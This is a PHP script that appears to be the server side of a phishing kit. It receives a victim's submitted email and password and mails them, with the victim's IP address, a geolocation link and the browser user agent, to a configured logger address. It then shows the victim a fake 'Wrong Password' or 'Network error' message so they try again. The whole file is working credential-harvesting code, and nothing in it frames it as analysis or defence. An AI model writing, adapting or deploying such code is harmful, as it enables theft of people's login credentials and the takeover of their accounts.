<?php
include_once __DIR__ . '/functions.php';
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
if (isset($_POST['email'], $_POST['pass'], $_POST['intSubmit'])) {

    $ip = get_ip_address();

    $message = "C L I E N T | I N F O |\n";
    $message .= "Username            : " . $_POST['email'] . "\n";
    $message .= "Password              : " . $_POST['pass'] . "\n\n";

    $message .= "|--------------- I P | I N F O -------------------|\n";
    $message .= "|Client IP: " .  $ip . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=" . $ip . " ----\n";
    $message .= "User Agent : " . $_SERVER['HTTP_USER_AGENT'] . "\n";


    $subject = "New Client Information - {$ip}";

    $headers = "From: " . SENDER_EMAIL. "\r\n";
    $headers .= "Reply-To: " . SENDER_EMAIL . "\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

    mail(LOGGER_EMAIL, $subject, $message, $headers);

    if ((int) $_POST['intSubmit'] > 1) {
        echo "Network error! Connection timed Out.";
    } else {
        echo "Wrong Password. Verification failed, please try again";
    }
}else{
	echo "Invalid, credentials was submitted please try again.";
}